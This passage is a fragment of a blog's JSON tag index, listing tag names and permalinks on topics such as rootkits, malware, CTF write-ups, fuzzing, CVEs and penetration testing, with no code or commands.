"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"c","slug":"c","permalink":"https://joe1sn.eu.org/tags/c/"},{"name":"python","slug":"python","permalink":"https://joe1sn.eu.org/tags/python/"},{"name":"bypass","slug":"bypass","permalink":"https://joe1sn.eu.org/tags/bypass/"},{"name":"note","slug":"note","permalink":"https://joe1sn.eu.org/tags/note/"},{"name":"rootkit","slug":"rootkit","permalink":"https://joe1sn.eu.org/tags/rootkit/"},{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"},{"name":"AI","slug":"AI","permalink":"https://joe1sn.eu.org/tags/AI/"},{"name":"source","slug":"source","permalink":"https://joe1sn.eu.org/tags/source/"},{"name":"MinHook","slug":"MinHook","permalink":"https://joe1sn.eu.org/tags/MinHook/"},{"name":"crack","slug":"crack","permalink":"https://joe1sn.eu.org/tags/crack/"},{"name":"cheats","slug":"cheats","permalink":"https://joe1sn.eu.org/tags/cheats/"},{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"},{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"},{"name":"pentest","slug":"pentest","permalink":"https://joe1sn.eu.org/tags/pentest/"},{"name":"cve","slug":"cve","permalink":"https://joe1sn.eu.org/tags/cve/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"stm32","slug":"stm32","permalink":"https://joe1sn.eu.org/tags/stm32/"},{"name":"AFL","slug":"AFL","permalink":"https://joe1sn.eu.org/tags/AFL/"},{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"},{"name":"CTF","slug":"CTF","permalink":"https://joe1sn.eu.org/tags/CTF/"},{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/tags/writeup/"},{"name":"cpp","slug":"cpp","permalink":"https://joe1sn.eu.org/tags/cpp/"},{"name":"muud","slug":"muud","permalink":"https://joe1sn.eu.org/tags/muud/"},{"name":"web framework","slug":"web-framework","permalink":"https://joe1sn.eu.org/tags/web-framework/"},{"name":"git","slug":"git","permalink":"https://joe1sn.eu.org/tags/git/"},{"name":"os","slug":"os","permalink":"https://joe1sn.eu.org/tags/os/"},{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/tags/misc/"},{"name":"渗透","slug":"渗透","permalink":"https://joe1sn.eu.org/tags/%E6%B8%97%E9%80%8F/"},{"name":"dbg","slug":"dbg","permalink":"https://joe1sn.eu.org/tags/dbg/"},{"name":"Windows","slug":"Windows","permalink":"https://joe1sn.eu.org/tags/Windows/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"spring","slug":"spring","permalink":"https://joe1sn.eu.org/tags/spring/"},{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://joe1sn.eu.org/tags/BUUCTF/"}]}